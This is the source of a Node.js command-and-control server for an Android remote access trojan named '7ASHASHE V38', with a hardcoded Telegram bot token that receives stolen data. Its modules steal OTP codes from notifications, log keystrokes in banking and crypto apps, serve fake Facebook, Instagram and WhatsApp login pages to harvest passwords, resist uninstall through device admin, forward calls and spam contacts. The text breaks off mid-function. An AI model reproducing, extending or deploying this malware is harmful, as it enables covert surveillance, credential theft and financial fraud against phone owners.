// =====================================================
// 7ASHASHE V38 - ULTIMATE WILD RAT
// گەشەپێدەر: 7ASHASHE - وەحشی هاک
// وەشان: 38.0.0 - WILD ULTIMATE
// توکن: 8745582802:AAEjH7IJ0RAu32mTRQo9G-yaNK7m-mgM91s
// چات ئایدی: 5578405082
// پۆرت: 8080
// =====================================================

const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const { spawn } = require('child_process');

// =====================================================
// 🔐 CREDENTIALS - 7ASHASHE
// =====================================================
const CONFIG = {
    TOKEN: '8745582802:AAEjH7IJ0RAu32mTRQo9G-yaNK7m-mgM91s',
    CHAT_ID: '5578405082',
    MASTER: '7ASHASHE',
    VERSION: '38.0.0',
    ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
    SESSION_SECRET: crypto.randomBytes(64).toString('hex'),
    PORT: process.env.PORT || 8080, // Changed to 8080
    MAX_FILE_SIZE: 100 * 1024 * 1024, // 100MB
    PING_INTERVAL: 30000, // 30 seconds
    RECONNECT_TIMEOUT: 5000, // 5 seconds
    AUTO_RESTART: true,
    BATTERY_OPTIMIZATION_BYPASS: true,
    ANTI_UNINSTALL: true
};

// =====================================================
// 📁 DIRECTORY STRUCTURE
// =====================================================
const DIRS = {
    DATA: path.join(__dirname, 'data'),
    PHOTOS: path.join(__dirname, 'data', 'photos'),
    VIDEOS: path.join(__dirname, 'data', 'videos'),
    AUDIO: path.join(__dirname, 'data', 'audio'),
    FILES: path.join(__dirname, 'data', 'files'),
    CONTACTS: path.join(__dirname, 'data', 'contacts'),
    SMS: path.join(__dirname, 'data', 'sms'),
    CALLS: path.join(__dirname, 'data', 'calls'),
    APPS: path.join(__dirname, 'data', 'apps'),
    KEYLOGS: path.join(__dirname, 'data', 'keylogs'),
    CLIPBOARD: path.join(__dirname, 'data', 'clipboard'),
    LOCATION: path.join(__dirname, 'data', 'location'),
    SCREENSHOTS: path.join(__dirname, 'data', 'screenshots'),
    SCREEN_RECORDS: path.join(__dirname, 'data', 'screen_records'),
    WHATSAPP: path.join(__dirname, 'data', 'whatsapp'),
    TELEGRAM: path.join(__dirname, 'data', 'telegram'),
    INSTAGRAM: path.join(__dirname, 'data', 'instagram'),
    FACEBOOK: path.join(__dirname, 'data', 'facebook'),
    GMAIL: path.join(__dirname, 'data', 'gmail'),
    PASSWORDS: path.join(__dirname, 'data', 'passwords'),
    CRYPTO: path.join(__dirname, 'data', 'crypto'),
    TWOFA: path.join(__dirname, 'data', '2fa'),
    RANSOMWARE: path.join(__dirname, 'data', 'ransomware'),
    DROPPER: path.join(__dirname, 'data', 'dropper'),
    LOGS: path.join(__dirname, 'data', 'logs'),
    NOTIFICATIONS: path.join(__dirname, 'data', 'notifications'),
    SCREEN_STREAMS: path.join(__dirname, 'data', 'screen_streams'),
    CALL_FORWARDING: path.join(__dirname, 'data', 'call_forwarding'),
    WIFI_CONTROL: path.join(__dirname, 'data', 'wifi_control'),
    DATABASE: path.join(__dirname, 'data', 'database.json')
};

// Create all directories
Object.values(DIRS).forEach(dir => {
    if (!dir.includes('.json') && !fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
    }
});

// Initialize database
if (!fs.existsSync(DIRS.DATABASE)) {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify({
        clients: {},
        stats: {
            total_connections: 0,
            total_files: 0,
            total_commands: 0,
            notifications_captured: 0,
            screen_streams: 0,
            calls_forwarded: 0,
            messages_spammed: 0,
            start_time: new Date().toISOString()
        }
    }, null, 2));
}

// =====================================================
// 🔧 UTILITY FUNCTIONS
// =====================================================
const readDB = () => {
    try {
        return JSON.parse(fs.readFileSync(DIRS.DATABASE, 'utf8'));
    } catch (e) {
        return { clients: {}, stats: {} };
    }
};

const writeDB = (data) => {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify(data, null, 2));
};

const encrypt = (data) => {
    const cipher = crypto.createCipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
};

const decrypt = (encrypted) => {
    const decipher = crypto.createDecipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
};

const logToFile = (type, data) => {
    const logFile = path.join(DIRS.LOGS, `${type}_${new Date().toISOString().split('T')[0]}.log`);
    fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`);
};

// =====================================================
// 🚀 FEATURE 1: PERSISTENT AUTO-RESTART
// =====================================================
const setupAutoRestart = () => {
    if (!CONFIG.AUTO_RESTART) return;
    
    const restartScript = `
        // Android auto-restart script
        public class AutoRestartReceiver extends BroadcastReceiver {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
                    Intent serviceIntent = new Intent(context, MainService.class);
                    context.startService(serviceIntent);
                }
            }
        }
        
        // Keep alive service
        public class KeepAliveService extends Service {
            @Override
            public int onStartCommand(Intent intent, int flags, int startId) {
                // Start as foreground service to prevent killing
                Notification notification = new Notification.Builder(this)
                    .setContentTitle("7ASHASHE")
                    .setContentText("System Service")
                    .build();
                startForeground(1, notification);
                return START_STICKY;
            }
        }
    `;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'AutoRestartReceiver.java'), restartScript);
    console.log('✅ Auto-Restart module installed');
};

// =====================================================
// 🚀 FEATURE 2: NOTIFICATION LISTENER
// =====================================================
class NotificationListener {
    constructor() {
        this.notifications = [];
        this.listening = false;
    }

    start() {
        this.listening = true;
        console.log('📱 Notification listener started');
    }

    captureNotification(notification) {
        const notif = {
            id: uuidv4(),
            app: notification.app || 'unknown',
            title: notification.title || '',
            text: notification.text || '',
            timestamp: new Date().toISOString(),
            priority: notification.priority || 'normal',
            icon: notification.icon || null
        };
        
        this.notifications.push(notif);
        
        // Save to file
        const notifFile = path.join(DIRS.NOTIFICATIONS, `${Date.now()}_${notif.app}.json`);
        fs.writeFileSync(notifFile, JSON.stringify(notif, null, 2));
        
        // Check for OTP/banking
        const isOTP = notif.text.match(/\b\d{4,6}\b/);
        const isBanking = ['bank', 'pay', 'card', 'money'].some(word => 
            notif.text.toLowerCase().includes(word) || notif.app.toLowerCase().includes(word)
        );
        
        if (isOTP || isBanking) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `💰 **🔐 Banking/OTP Alert**\n\n` +
                `📱 ئەپ: ${notif.app}\n` +
                `📌 ناونیشان: ${notif.title}\n` +
                `📝 پەیام: ${notif.text}\n` +
                `🔢 OTP: ${notif.text.match(/\b\d{4,6}\b/)}\n` +
                `⏰ کات: ${new Date(notif.timestamp).toLocaleString()}`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.sendMessage(CONFIG.CHAT_ID,
                `📱 **نۆتیفیکەیشن**\n\n` +
                `📱 ئەپ: ${notif.app}\n` +
                `📌 ناونیشان: ${notif.title}\n` +
                `📝 پەیام: ${notif.text}\n` +
                `⏰ کات: ${new Date(notif.timestamp).toLocaleString()}`,
                { parse_mode: 'Markdown' }
            );
        }
        
        // Update stats
        const db = readDB();
        db.stats.notifications_captured++;
        writeDB(db);
        
        return notif;
    }

    getNotifications() {
        return this.notifications;
    }
}

const notificationListener = new NotificationListener();

// API endpoint for notifications
app.post('/api/notification', (req, res) => {
    const notification = req.body;
    const captured = notificationListener.captureNotification(notification);
    res.json({ success: true, notification: captured });
});

// =====================================================
// 🚀 FEATURE 3: SCREEN STREAM (WebRTC)
// =====================================================
class ScreenStreamer {
    constructor() {
        this.streams = new Map();
        this.activeStreams = 0;
    }

    async startStream(clientId, options = { quality: 'high', fps: 30 }) {
        try {
            const stream = {
                id: uuidv4(),
                clientId,
                options,
                startedAt: new Date().toISOString(),
                frames: 0,
                active: true,
                viewers: 0
            };
            
            this.streams.set(stream.id, stream);
            this.activeStreams++;
            
            // Save stream info
            const streamFile = path.join(DIRS.SCREEN_STREAMS, `${stream.id}.json`);
            fs.writeFileSync(streamFile, JSON.stringify(stream, null, 2));
            
            // Update stats
            const db = readDB();
            db.stats.screen_streams++;
            writeDB(db);
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `📹 **Screen Stream Started**\n\n` +
                `🆔 Client: ${clientId.substring(0, 8)}...\n` +
                `📊 Quality: ${options.quality}\n` +
                `🎞️ FPS: ${options.fps}\n` +
                `🆔 Stream: ${stream.id.substring(0, 8)}...`,
                { parse_mode: 'Markdown' }
            );
            
            return stream;
        } catch (error) {
            console.error('Screen stream error:', error);
            return null;
        }
    }

    stopStream(streamId) {
        const stream = this.streams.get(streamId);
        if (stream) {
            stream.active = false;
            this.streams.delete(streamId);
            this.activeStreams--;
            
            const duration = Math.floor((Date.now() - new Date(stream.startedAt)) / 1000);
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `⏹️ **Screen Stream Ended**\n\n` +
                `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
                `📊 Frames: ${stream.frames}\n` +
                `⏱️ Duration: ${duration}s\n` +
                `👁️ Viewers: ${stream.viewers}`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    getActiveStreams() {
        return Array.from(this.streams.values()).filter(s => s.active);
    }
}

const screenStreamer = new ScreenStreamer();

// API endpoint for screen stream
app.post('/api/screen/stream', (req, res) => {
    const { clientId, options } = req.body;
    screenStreamer.startStream(clientId, options).then(stream => {
        res.json({ success: true, streamId: stream.id });
    });
});

app.post('/api/screen/stop/:streamId', (req, res) => {
    const { streamId } = req.params;
    screenStreamer.stopStream(streamId);
    res.json({ success: true });
});

app.post('/api/screen/frame', (req, res) => {
    const { streamId, frame } = req.body;
    const stream = screenStreamer.streams.get(streamId);
    if (stream && stream.active) {
        stream.frames++;
        // Save frame or process
    }
    res.json({ success: true });
});

// =====================================================
// 🚀 FEATURE 4: SMART KEYLOGGER
// =====================================================
class SmartKeylogger {
    constructor() {
        this.logs = [];
        this.activeApps = new Map();
        this.bankingApps = [
            'bank', 'paypal', 'crypto', 'wallet', 'pay', 
            'cash', 'money', 'coinbase', 'binance', 'trust'
        ];
    }

    logKey(clientId, key, app) {
        const log = {
            id: uuidv4(),
            clientId,
            key,
            app: app || 'system',
            timestamp: new Date().toISOString(),
            isSensitive: this.isSensitiveApp(app)
        };
        
        this.logs.push(log);
        
        // Save to file
        const logFile = path.join(DIRS.KEYLOGS, `${app}_${new Date().toISOString().split('T')[0]}.log`);
        fs.appendFileSync(logFile, `[${log.timestamp}] ${key}\n`);
        
        // Special handling for banking apps
        if (this.isSensitiveApp(app)) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `💰 **💰 Banking Alert**\n\n` +
                `📱 ئەپ: ${app}\n` +
                `⌨️ Key: ${key}\n` +
                `🆔 Client: ${clientId.substring(0, 8)}...\n` +
                `⚠️ Sensitive App Detected`,
                { parse_mode: 'Markdown' }
            );
        }
        
        return log;
    }

    isSensitiveApp(app) {
        return this.bankingApps.some(b => app.toLowerCase().includes(b));
    }

    getLogs(app = null) {
        if (app) {
            return this.logs.filter(l => l.app === app);
        }
        return this.logs;
    }

    startTracking(clientId, app) {
        this.activeApps.set(clientId, app);
        bot.sendMessage(CONFIG.CHAT_ID,
            `⌨️ **Smart Keylogger Started**\n\n` +
            `📱 ئەپ: ${app}\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⚠️ Will monitor banking activity`,
            { parse_mode: 'Markdown' }
        );
    }

    stopTracking(clientId) {
        this.activeApps.delete(clientId);
    }

    getBankingLogs() {
        return this.logs.filter(l => l.isSensitive);
    }
}

const smartKeylogger = new SmartKeylogger();

// API endpoint for keylogger
app.post('/api/keylogger', (req, res) => {
    const { clientId, key, app } = req.body;
    smartKeylogger.logKey(clientId, key, app);
    res.json({ success: true });
});

app.post('/api/keylogger/start/:clientId', (req, res) => {
    const { clientId } = req.params;
    const { app } = req.body;
    smartKeylogger.startTracking(clientId, app);
    res.json({ success: true });
});

// =====================================================
// 🚀 FEATURE 5: SOCIAL MEDIA OVERLAY
// =====================================================
class SocialMediaOverlay {
    constructor() {
        this.overlays = [];
        this.templates = {
            facebook: {
                name: 'Facebook',
                logo: 'https://facebook.com/favicon.ico',
                fields: ['email', 'password']
            },
            instagram: {
                name: 'Instagram',
                logo: 'https://instagram.com/favicon.ico',
                fields: ['username', 'password']
            },
            whatsapp: {
                name: 'WhatsApp',
                logo: 'https://whatsapp.com/favicon.ico',
                fields: ['phone', 'password']
            },
            telegram: {
                name: 'Telegram',
                logo: 'https://telegram.org/favicon.ico',
                fields: ['phone', 'password']
            },
            twitter: {
                name: 'Twitter',
                logo: 'https://twitter.com/favicon.ico',
                fields: ['email', 'password']
            }
        };
    }

    async createOverlay(platform, clientId) {
        const template = this.templates[platform];
        if (!template) return null;
        
        const overlay = {
            id: uuidv4(),
            platform,
            clientId,
            createdAt: new Date().toISOString(),
            url: this.getFakeLoginUrl(platform),
            credentials: [],
            template
        };
        
        this.overlays.push(overlay);
        
        // Create fake HTML page
        const htmlPath = path.join(DIRS.DROPPER, `${platform}_fake_${Date.now()}.html`);
        const htmlContent = this.generateFakeLoginPage(platform, template);
        fs.writeFileSync(htmlPath, htmlContent);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🎭 **Social Media Overlay Created**\n\n` +
            `📱 Platform: ${platform}\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `🔗 URL: ${overlay.url}\n` +
            `📁 HTML: ${htmlPath}`,
            { parse_mode: 'Markdown' }
        );
        
        return overlay;
    }

    getFakeLoginUrl(platform) {
        const urls = {
            facebook: 'https://facebook-login-verify.com',
            instagram: 'https://instagram-security.com',
            whatsapp: 'https://whatsapp-web-verify.com',
            telegram: 'https://telegram-auth.com',
            twitter: 'https://twitter-verify.com'
        };
        return urls[platform] || 'https://login-verify.com';
    }

    generateFakeLoginPage(platform, template) {
        const fields = template.fields.map(f => 
            `<input type="${f.includes('password') ? 'password' : 'text'}" name="${f}" placeholder="${f}" required>`
        ).join('');
        
        return `
            <!DOCTYPE html>
            <html>
            <head>
                <title>${template.name} Login</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background: #f0f2f5;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .login-box {
                        background: white;
                        padding: 40px;
                        border-radius: 8px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                        width: 350px;
                    }
                    h2 {
                        text-align: center;
                        color: #1877f2;
                        margin-bottom: 30px;
                    }
                    input {
                        width: 100%;
                        padding: 12px;
                        margin: 8px 0;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                        box-sizing: border-box;
                    }
                    button {
                        width: 100%;
                        padding: 12px;
                        background: #1877f2;
                        color: white;
                        border: none;
                        border-radius: 4px;
                        cursor: pointer;
                        font-size: 16px;
                        margin-top: 10px;
                    }
                    button:hover {
                        background: #166fe5;
                    }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>${template.name}</h2>
                    <form method="POST" action="/api/overlay/capture">
                        <input type="hidden" name="platform" value="${platform}">
                        ${fields}
                        <button type="submit">Log In</button>
                    </form>
                </div>
            </body>
            </html>
        `;
    }

    captureCredentials(platform, credentials) {
        const overlay = this.overlays.find(o => o.platform === platform);
        if (overlay) {
            overlay.credentials.push({
                ...credentials,
                timestamp: new Date().toISOString()
            });
        }
        
        const credFile = path.join(DIRS.PASSWORDS, `${platform}_${Date.now()}.json`);
        fs.writeFileSync(credFile, JSON.stringify(credentials, null, 2));
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🔐 **🔐 Credentials Captured**\n\n` +
            `📱 Platform: ${platform}\n` +
            `👤 Username: ${credentials.username || credentials.email || credentials.phone}\n` +
            `🔑 Password: ${credentials.password}\n` +
            `⏰ Time: ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
        );
    }
}

const socialMediaOverlay = new SocialMediaOverlay();

// API endpoints for overlay
app.post('/api/overlay/create', (req, res) => {
    const { platform, clientId } = req.body;
    socialMediaOverlay.createOverlay(platform, clientId).then(overlay => {
        res.json({ success: true, overlay });
    });
});

app.post('/api/overlay/capture', (req, res) => {
    const credentials = req.body;
    socialMediaOverlay.captureCredentials(credentials.platform, credentials);
    res.redirect('https://google.com');
});

// =====================================================
// 🚀 FEATURE 6: BATTERY OPTIMIZATION BYPASS
// =====================================================
const setupBatteryOptimizationBypass = () => {
    if (!CONFIG.BATTERY_OPTIMIZATION_BYPASS) return;
    
    const bypassScript = `
        // Android battery optimization bypass
        public class BatteryOptimization {
            public static void requestIgnoreBatteryOptimizations(Context context) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Intent intent = new Intent();
                    String packageName = context.getPackageName();
                    PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        intent.setData(Uri.parse("package:" + packageName));
                        context.startActivity(intent);
                    }
                }
            }
            
            public static void enableBackgroundRestriction(Context context) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS);
                    intent.setData(Uri.parse("package:" + context.getPackageName()));
                    context.startActivity(intent);
                }
            }
        }
    `;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'BatteryOptimization.java'), bypassScript);
    console.log('✅ Battery Optimization Bypass installed');
};

// =====================================================
// 🚀 FEATURE 7: ANTI-UNINSTALL
// =====================================================
const setupAntiUninstall = () => {
    if (!CONFIG.ANTI_UNINSTALL) return;
    
    const antiUninstallScript = `
        // Android anti-uninstall via Device Admin
        public class AntiUninstall extends DeviceAdminReceiver {
            private static final String TAG = "AntiUninstall";
            
            @Override
            public void onEnabled(Context context, Intent intent) {
                super.onEnabled(context, intent);
                Log.d(TAG, "Device admin enabled");
            }
            
            @Override
            public void onDisabled(Context context, Intent intent) {
                // Re-enable admin if disabled
                ComponentName componentName = new ComponentName(context, AntiUninstall.class);
                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                
                // Try to re-enable
                Intent enableIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                enableIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                enableIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for security");
                enableIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(enableIntent);
                
                Log.d(TAG, "Attempting to re-enable device admin");
            }
            
            @Override
            public void onPasswordChanged(Context context, Intent intent) {
                Log.d(TAG, "Password changed");
            }
            
            @Override
            public void onPasswordFailed(Context context, Intent intent) {
                Log.d(TAG, "Password failed");
            }
            
            @Override
            public void onPasswordSucceeded(Context context, Intent intent) {
                Log.d(TAG, "Password succeeded");
            }
        }
        
        // Manifest configuration
        // <receiver android:name=".AntiUninstall"
        //     android:permission="android.permission.BIND_DEVICE_ADMIN">
        //     <meta-data android:name="android.app.device_admin"
        //         android:resource="@xml/device_admin" />
        //     <intent-filter>
        //         <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
        //     </intent-filter>
        // </receiver>
    `;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'AntiUninstall.java'), antiUninstallScript);
    
    // Create device admin XML
    const deviceAdminXml = `<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password />
        <watch-login />
        <reset-password />
        <force-lock />
        <wipe-data />
        <expire-password />
        <encrypted-storage />
        <disable-camera />
    </uses-policies>
</device-admin>`;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'device_admin.xml'), deviceAdminXml);
    console.log('✅ Anti-Uninstall module installed');
};

// =====================================================
// 🚀 FEATURE 8: BYPASS LOCK SCREEN
// =====================================================
class LockScreenBypass {
    constructor() {
        this.active = false;
    }

    wakeUpDevice(clientId) {
        bot.sendMessage(CONFIG.CHAT_ID,
            `🔓 **Wake Up Device**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⚡ Sending wake up command...`,
            { parse_mode: 'Markdown' }
        );
        
        // Send WebSocket command
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'wake_up',
                timestamp: Date.now()
            }));
        }
    }

    keepScreenOn(clientId, enable = true) {
        this.active = enable;
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '🔒' : '🔓'} **Keep Screen ${enable ? 'ON' : 'OFF'}**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⚡ Screen will ${enable ? 'stay on' : 'normal'}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'keep_screen',
                enable,
                timestamp: Date.now()
            }));
        }
    }
}

const lockScreenBypass = new LockScreenBypass();

// =====================================================
// 🚀 FEATURE 9: CALL FORWARDING
// =====================================================
class CallForwarding {
    constructor() {
        this.forwardings = new Map();
    }

    forwardCalls(clientId, targetNumber) {
        const forwarding = {
            id: uuidv4(),
            clientId,
            targetNumber,
            startedAt: new Date().toISOString(),
            active: true,
            forwardedCalls: 0
        };
        
        this.forwardings.set(forwarding.id, forwarding);
        
        // Save to file
        const forwardFile = path.join(DIRS.CALL_FORWARDING, `${forwarding.id}.json`);
        fs.writeFileSync(forwardFile, JSON.stringify(forwarding, null, 2));
        
        // Update stats
        const db = readDB();
        db.stats.calls_forwarded++;
        writeDB(db);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `📞 **Call Forwarding Activated**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 Target: ${targetNumber}\n` +
            `🆔 Forward: ${forwarding.id.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
        
        // Send WebSocket command
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'call_forward',
                target: targetNumber,
                timestamp: Date.now()
            }));
        }
        
        return forwarding;
    }

    stopForwarding(forwardId) {
        const forwarding = this.forwardings.get(forwardId);
        if (forwarding) {
            forwarding.active = false;
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `⏹️ **Call Forwarding Stopped**\n\n` +
                `🆔 Client: ${forwarding.clientId.substring(0, 8)}...\n` +
                `📊 Calls Forwarded: ${forwarding.forwardedCalls}`,
                { parse_mode: 'Markdown' }
            );
            
            const client = clients.get(forwarding.clientId);
            if (client && client.ws.readyState === WebSocket.OPEN) {
                client.ws.send(JSON.stringify({
                    type: 'stop_call_forward',
                    timestamp: Date.now()
                }));
            }
        }
    }
}

const callForwarding = new CallForwarding();

// =====================================================
// 🚀 FEATURE 10: CONTACTS SPAM
// =====================================================
class ContactsSpam {
    constructor() {
        this.activeSpams = new Map();
    }

    async spamAllContacts(clientId, message) {
        const spam = {
            id: uuidv4(),
            clientId,
            message,
            startedAt: new Date().toISOString(),
            sent: 0,
            total: 0,
            active: true
        };
        
        this.activeSpams.set(spam.id, spam);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `📨 **Contacts Spam Started**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📝 Message: ${message}\n` +
            `⚡ Sending...`,
            { parse_mode: 'Markdown' }
        );
        
        // Update stats
        const db = readDB();
        db.stats.messages_spammed++;
        writeDB(db);
        
        // Send WebSocket command
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'spam_contacts',
                message,
                timestamp: Date.now()
            }));
        }
        
        return spam;
    }

    updateProgress(spamId, sent, total) {
        const spam = this.activeSpams.get(spamId);
        if (spam) {
            spam.sent = sent;
            spam.total = total;
            
            if (sent >= total) {
                spam.active = false;
                bot.sendMessage(CONFIG.CHAT_ID,
                    `✅ **Spam Complete**\n\n` +
                    `📊 Sent: ${sent}/${total} messages`,
                    { parse_mode: 'Markdown' }
                );
                this.activeSpams.delete(spamId);
            }
        }
    }
}

const contactsSpam = new ContactsSpam();

// API endpoint for spam progress
app.post('/api/spam/progress', (req, res) => {
    const { spamId, sent, total } = req.body;
    contactsSpam.updateProgress(spamId, sent, total);
    res.json({ success: true });
});

// =====================================================
// 🚀 FEATURE 11: APP KILLER/BLOCKER
// =====================================================
class AppKiller {
    constructor() {
        this.blockedApps = new Map();
    }

    killApp(clientId, appPackage) {
        bot.sendMessage(CONFIG.CHAT_ID,
            `🛑 **Killing App**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 App: ${appPackage}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'kill_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
    }

    blockApp(clientId, appPackage) {
        this.blockedApps.set(`${clientId}:${appPackage}`, true);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🚫 **Blocking App**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 App: ${appPackage}\n` +
            `⚡ App will be blocked from opening`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'block_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
    }

    unblockApp(clientId, appPackage) {
        this.blockedApps.delete(`${clientId}:${appPackage}`);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `✅ **Unblocking App**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 App: ${appPackage}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'unblock_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
    }
}

const appKiller = new AppKiller();

// =====================================================
// 🚀 FEATURE 12: SELF-DESTRUCT
// =====================================================
class SelfDestruct {
    constructor() {
        this.active = false;
    }

    async execute(clientId, masterPassword) {
        if (masterPassword !== CONFIG.ENCRYPTION_KEY.substring(0, 8)) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `❌ **Invalid Password**\n\n` +
                `Self-destruct aborted`,
                { parse_mode: 'Markdown' }
            );
            return false;
        }
        
        this.active = true;
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `💥 **💥 SELF-DESTRUCT INITIATED**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⏱️ Time: 10 seconds\n` +
            `⚠️ All data will be wiped`,
            { parse_mode: 'Markdown' }
        );
        
        // Send self-destruct command
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'self_destruct',
                timestamp: Date.now()
            }));
        }
        
        // Clean up server data
        setTimeout(() => {
            // Delete client data
            const db = readDB();
            delete db.clients[clientId];
            writeDB(db);
            
            // Delete all files for this client
            Object.values(DIRS).forEach(dir => {
                if (!dir.includes('.json') && fs.existsSync(dir)) {
                    const files = fs.readdirSync(dir);
                    files.forEach(file => {
                        const filePath = path.join(dir, file);
                        try {
                            fs.unlinkSync(filePath);
                        } catch (e) {}
                    });
                }
            });
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `✅ **Self-destruct Complete**\n\n` +
                `All client data wiped`,
                { parse_mode: 'Markdown' }
            );
            
            this.active = false;
        }, 10000);
        
        return true;
    }
}

const selfDestruct = new SelfDestruct();

// =====================================================
// 🚀 FEATURE 13: WIFI & BLUETOOTH CONTROL
// =====================================================
class WifiBluetoothControl {
    constructor() {
        this.wifiState = new Map();
        this.bluetoothState = new Map();
    }

    toggleWifi(clientId, enable) {
        this.wifiState.set(clientId, enable);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '📶' : '❌'} **WiFi ${enable ? 'ON' : 'OFF'}**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_wifi',
                enable,
                timestamp: Date.now()
            }));
        }
    }

    toggleBluetooth(clientId, enable) {
        this.bluetoothState.set(clientId, enable);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '📱' : '❌'} **Bluetooth ${enable ? 'ON' : 'OFF'}**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_bluetooth',
                enable,
                timestamp: Date.now()
            }));
        }
    }

    changeDeviceName(clientId, newName) {
        bot.sendMessage(CONFIG.CHAT_ID,
